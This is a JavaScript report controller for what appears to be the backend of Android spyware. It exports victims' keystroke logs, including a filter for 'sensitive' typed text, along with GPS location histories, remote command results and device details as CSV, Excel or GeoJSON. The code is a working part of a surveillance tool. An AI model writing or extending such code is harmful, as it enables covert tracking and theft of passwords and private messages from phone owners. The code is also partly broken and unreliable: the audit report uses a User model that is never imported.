const Device = require('../models/Device');
const Command = require('../models/Command');
const Alert = require('../models/Alert');
const Keylog = require('../models/Keylog');
const Location = require('../models/Location');
const { logger } = require('../utils/logger');
const { Parser } = require('json2csv');
const ExcelJS = require('exceljs');

// Generate device report
const generateDeviceReport = async (req, res) => {
  try {
    const userId = req.user._id;
    const { deviceId, format = 'json', startDate, endDate } = req.query;

    const query = { userId };
    if (deviceId) query.deviceId = deviceId;

    let devices = await Device.find(query);
    
    // Filter by date range
    if (startDate || endDate) {
      devices = devices.filter(device => {
        const createdAt = new Date(device.createdAt);
        if (startDate && createdAt < new Date(startDate)) return false;
        if (endDate && createdAt > new Date(endDate)) return false;
        return true;
      });
    }

    const reportData = devices.map(device => ({
      deviceId: device.deviceId,
      deviceName: device.deviceName,
      brand: device.brand,
      model: device.model,
      status: device.status,
      platform: device.platform,
      androidVersion: device.androidVersion,
      cpu: device.cpu,
      memory: device.memory,
      batteryLevel: device.battery?.level,
      lastSeen: device.heartbeat?.lastSeen,
      createdAt: device.createdAt,
      isOnline: device.isOnline
    }));

    // Export based on format
    switch (format) {
      case 'csv':
        const json2csvParser = new Parser();
        const csv = json2csvParser.parse(reportData);
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=device-report.csv');
        return res.send(csv);
      
      case 'excel':
        const workbook = new ExcelJS.Workbook();
        const worksheet = workbook.addWorksheet('Devices');
        
        worksheet.columns = [
          { header: 'Device ID', key: 'deviceId', width: 30 },
          { header: 'Device Name', key: 'deviceName', width: 20 },
          { header: 'Brand', key: 'brand', width: 15 },
          { header: 'Model', key: 'model', width: 15 },
          { header: 'Status', key: 'status', width: 10 },
          { header: 'CPU %', key: 'cpu', width: 10 },
          { header: 'Memory %', key: 'memory', width: 10 },
          { header: 'Battery %', key: 'batteryLevel', width: 10 },
          { header: 'Last Seen', key: 'lastSeen', width: 20 },
          { header: 'Created At', key: 'createdAt', width: 20 }
        ];
        
        reportData.forEach(row => worksheet.addRow(row));
        
        res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
        res.setHeader('Content-Disposition', 'attachment; filename=device-report.xlsx');
        await workbook.xlsx.write(res);
        return res.end();
      
      default:
        res.json({
          success: true,
          data: reportData,
          total: reportData.length,
          generatedAt: new Date()
        });
    }
  } catch (error) {
    logger.error('Generate device report error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Generate command report
const generateCommandReport = async (req, res) => {
  try {
    const userId = req.user._id;
    const { deviceId, startDate, endDate, format = 'json' } = req.query;

    const query = { userId };
    if (deviceId) query.deviceId = deviceId;
    if (startDate) query.createdAt = { ...query.createdAt, $gte: new Date(startDate) };
    if (endDate) query.createdAt = { ...query.createdAt, $lte: new Date(endDate) };

    const commands = await Command.find(query).sort({ createdAt: -1 });

    const reportData = commands.map(cmd => ({
      commandId: cmd.commandId,
      deviceId: cmd.deviceId,
      type: cmd.type,
      status: cmd.status,
      params: JSON.stringify(cmd.params),
      result: cmd.result ? JSON.stringify(cmd.result) : null,
      error: cmd.error,
      createdAt: cmd.createdAt,
      executedAt: cmd.executedAt,
      completedAt: cmd.completedAt
    }));

    if (format === 'csv') {
      const json2csvParser = new Parser();
      const csv = json2csvParser.parse(reportData);
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', 'attachment; filename=command-report.csv');
      return res.send(csv);
    }

    res.json({
      success: true,
      data: reportData,
      total: reportData.length,
      summary: {
        total: commands.length,
        completed: commands.filter(c => c.status === 'completed').length,
        failed: commands.filter(c => c.status === 'failed').length,
        pending: commands.filter(c => c.status === 'pending').length
      },
      generatedAt: new Date()
    });
  } catch (error) {
    logger.error('Generate command report error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Generate alert report
const generateAlertReport = async (req, res) => {
  try {
    const userId = req.user._id;
    const { deviceId, severity, startDate, endDate, format = 'json' } = req.query;

    const query = { userId };
    if (deviceId) query.deviceId = deviceId;
    if (severity) query.severity = severity;
    if (startDate) query.createdAt = { ...query.createdAt, $gte: new Date(startDate) };
    if (endDate) query.createdAt = { ...query.createdAt, $lte: new Date(endDate) };

    const alerts = await Alert.find(query).sort({ createdAt: -1 });

    const reportData = alerts.map(alert => ({
      alertId: alert.alertId,
      deviceId: alert.deviceId,
      type: alert.type,
      severity: alert.severity,
      title: alert.title,
      message: alert.message,
      value: alert.value,
      threshold: alert.threshold,
      status: alert.status,
      createdAt: alert.createdAt,
      resolvedAt: alert.resolvedAt
    }));

    const severityStats = {
      critical: alerts.filter(a => a.severity === 'critical').length,
      warning: alerts.filter(a => a.severity === 'warning').length,
      info: alerts.filter(a => a.severity === 'info').length,
      emergency: alerts.filter(a => a.severity === 'emergency').length
    };

    if (format === 'csv') {
      const json2csvParser = new Parser();
      const csv = json2csvParser.parse(reportData);
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', 'attachment; filename=alert-report.csv');
      return res.send(csv);
    }

    res.json({
      success: true,
      data: reportData,
      total: reportData.length,
      summary: severityStats,
      generatedAt: new Date()
    });
  } catch (error) {
    logger.error('Generate alert report error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Generate location report
const generateLocationReport = async (req, res) => {
  try {
    const userId = req.user._id;
    const { deviceId, startDate, endDate, format = 'json' } = req.query;

    if (!deviceId) {
      return res.status(400).json({
        success: false,
        error: 'Device ID is required'
      });
    }

    const query = { deviceId, userId };
    if (startDate) query.timestamp = { ...query.timestamp, $gte: new Date(startDate) };
    if (endDate) query.timestamp = { ...query.timestamp, $lte: new Date(endDate) };

    const locations = await Location.find(query).sort({ timestamp: -1 });

    const reportData = locations.map(loc => ({
      latitude: loc.latitude,
      longitude: loc.longitude,
      accuracy: loc.accuracy,
      speed: loc.speed,
      altitude: loc.altitude,
      address: loc.address,
      timestamp: loc.timestamp
    }));

    // Calculate total distance
    let totalDistance = 0;
    for (let i = 1; i < locations.length; i++) {
      const prev = locations[i-1];
      const curr = locations[i];
      const distance = calculateDistance(
        prev.latitude, prev.longitude,
        curr.latitude, curr.longitude
      );
      totalDistance += distance;
    }

    if (format === 'csv') {
      const json2csvParser = new Parser();
      const csv = json2csvParser.parse(reportData);
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', 'attachment; filename=location-report.csv');
      return res.send(csv);
    }

    if (format === 'geojson') {
      const geojson = {
        type: 'FeatureCollection',
        features: locations.map(loc => ({
          type: 'Feature',
          geometry: {
            type: 'Point',
            coordinates: [loc.longitude, loc.latitude]
          },
          properties: {
            timestamp: loc.timestamp,
            speed: loc.speed,
            accuracy: loc.accuracy
          }
        }))
      };
      return res.json(geojson);
    }

    res.json({
      success: true,
      data: reportData,
      total: reportData.length,
      summary: {
        totalDistance: totalDistance.toFixed(2),
        startDate: locations[locations.length - 1]?.timestamp,
        endDate: locations[0]?.timestamp
      },
      generatedAt: new Date()
    });
  } catch (error) {
    logger.error('Generate location report error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Generate keylog report
const generateKeylogReport = async (req, res) => {
  try {
    const userId = req.user._id;
    const { deviceId, startDate, endDate, sensitiveOnly = false, format = 'json' } = req.query;

    const query = { deviceId, userId };
    if (sensitiveOnly === 'true') query.isSensitive = true;
    if (startDate) query.timestamp = { ...query.timestamp, $gte: new Date(startDate) };
    if (endDate) query.timestamp = { ...query.timestamp, $lte: new Date(endDate) };

    const keylogs = await Keylog.find(query).sort({ timestamp: -1 });

    const reportData = keylogs.map(log => ({
      text: log.text,
      app: log.app,
      packageName: log.packageName,
      isSensitive: log.isSensitive,
      timestamp: log.timestamp
    }));

    if (format === 'csv') {
      const json2csvParser = new Parser();
      const csv = json2csvParser.parse(reportData);
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', 'attachment; filename=keylog-report.csv');
      return res.send(csv);
    }

    res.json({
      success: true,
      data: reportData,
      total: reportData.length,
      summary: {
        sensitiveCount: keylogs.filter(k => k.isSensitive).length,
        uniqueApps: [...new Set(keylogs.map(k => k.app))].length
      },
      generatedAt: new Date()
    });
  } catch (error) {
    logger.error('Generate keylog report error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Generate audit report
const generateAuditReport = async (req, res) => {
  try {
    const userId = req.user._id;
    const { startDate, endDate, action, format = 'json' } = req.query;

    const query = { userId };
    if (action) query.action = action;
    if (startDate) query.timestamp = { ...query.timestamp, $gte: new Date(startDate) };
    if (endDate) query.timestamp = { ...query.timestamp, $lte: new Date(endDate) };

    const user = await User.findById(userId);
    const auditLogs = user?.auditLog || [];
    
    const filteredLogs = auditLogs.filter(log => {
      if (startDate && new Date(log.timestamp) < new Date(startDate)) return false;
      if (endDate && new Date(log.timestamp) > new Date(endDate)) return false;
      if (action && log.action !== action) return false;
      return true;
    });

    const reportData = filteredLogs.map(log => ({
      action: log.action,
      resource: log.resource,
      resourceId: log.resourceId,
      details: JSON.stringify(log.details),
      ip: log.ip,
      userAgent: log.userAgent,
      timestamp: log.timestamp
    }));

    if (format === 'csv') {
      const json2csvParser = new Parser();
      const csv = json2csvParser.parse(reportData);
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', 'attachment; filename=audit-report.csv');
      return res.send(csv);
    }

    res.json({
      success: true,
      data: reportData,
      total: reportData.length,
      summary: {
        uniqueActions: [...new Set(filteredLogs.map(l => l.action))].length,
        dateRange: {
          start: startDate || filteredLogs[filteredLogs.length - 1]?.timestamp,
          end: endDate || filteredLogs[0]?.timestamp
        }
      },
      generatedAt: new Date()
    });
  } catch (error) {
    logger.error('Generate audit report error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

// Helper function to calculate distance between two points
function calculateDistance(lat1, lon1, lat2, lon2) {
  const R = 6371; // Earth's radius in km
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon/2) * Math.sin(dLon/2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  return R * c;
}

module.exports = {
  generateDeviceReport,
  generateCommandReport,
  generateAlertReport,
  generateLocationReport,
  generateKeylogReport,
  generateAuditReport
};
